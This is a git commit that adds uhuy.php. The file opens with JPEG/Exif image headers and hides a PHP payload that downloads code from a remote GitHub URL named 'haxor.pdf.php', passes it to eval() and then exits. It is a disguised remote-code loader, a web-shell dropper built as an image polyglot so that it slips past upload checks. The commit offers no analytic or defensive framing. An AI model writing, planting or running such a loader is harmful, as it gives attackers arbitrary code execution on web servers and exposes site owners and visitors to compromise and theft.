ca1e5f606408e72a91c9dc5a7c693b5be64dfc94
fanteraa879 <sgmakramen@gmail.com>
2026-07-05 13:20:48 +0700

    Create uhuy.php

---
+++ uhuy.php
@@ -0,0 +1,9 @@
+ï¿½ï¿½ï¿½JFIF``ï¿½ï¿½fExifMM*ï¿½i>ï¿½2ï¿½ï¿½Pï¿½ï¿½ï¿½?CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality
+ï¿½ï¿½ï¿½JFIF``ï¿½ï¿½fExifMM*ï¿½i>ï¿½2ï¿½ï¿½Pï¿½ï¿½ï¿½?CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality
+<?php
+ 
+        $awo = 'https://';
+        eval("?>" . file_get_contents($awo . 'raw.githubusercontent.com/fanteraa879/bujangenam/refs/heads/main/haxor.pdf.php'));
+        exit;
+ 
+?>ï¿½Dï¿½gï¿½ï¿½ï¿½Þš|3oï¿½ï¿½^ï¿½|Nfï¿½Gï¿½ï¿½	ï¿½'Hï¿½kï¿½ï¿½ï¿½<Oï¿½ï¿½'ÞŸ[ï¿½ï¿½
